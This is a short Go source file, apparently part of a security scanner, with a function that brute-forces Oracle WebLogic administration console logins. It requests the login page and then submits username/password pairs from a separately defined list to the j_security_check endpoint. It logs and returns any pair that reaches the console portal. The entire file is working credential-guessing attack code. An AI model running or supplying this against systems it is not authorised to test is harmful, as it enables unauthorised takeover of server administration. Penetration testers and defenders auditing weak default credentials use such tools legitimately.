package brute

import (
	"fmt"
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
	"strings"
)

func WeblogicBrute(url string) (username string, password string) {
	if req, err := httpx.Request(url+"/console/login/LoginForm.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 {
			for uspa := range weblogicuserpass {
				if req2, err2 := httpx.Request(url+"/console/j_security_check", "POST", fmt.Sprintf("j_username=%s&j_password=%s", weblogicuserpass[uspa].Username, weblogicuserpass[uspa].Password), true, nil); err2 == nil {
					if strings.Contains(req2.RequestUrl, "console.portal") {
						logging.Logger.Infof(fmt.Sprintf("Found vuln Weblogic password|%s:%s|%s\n", weblogicuserpass[uspa].Username, weblogicuserpass[uspa].Password, url+"/console/"))
						return weblogicuserpass[uspa].Username, weblogicuserpass[uspa].Password

					}
				}
			}
		}
	}
	return "", ""
}
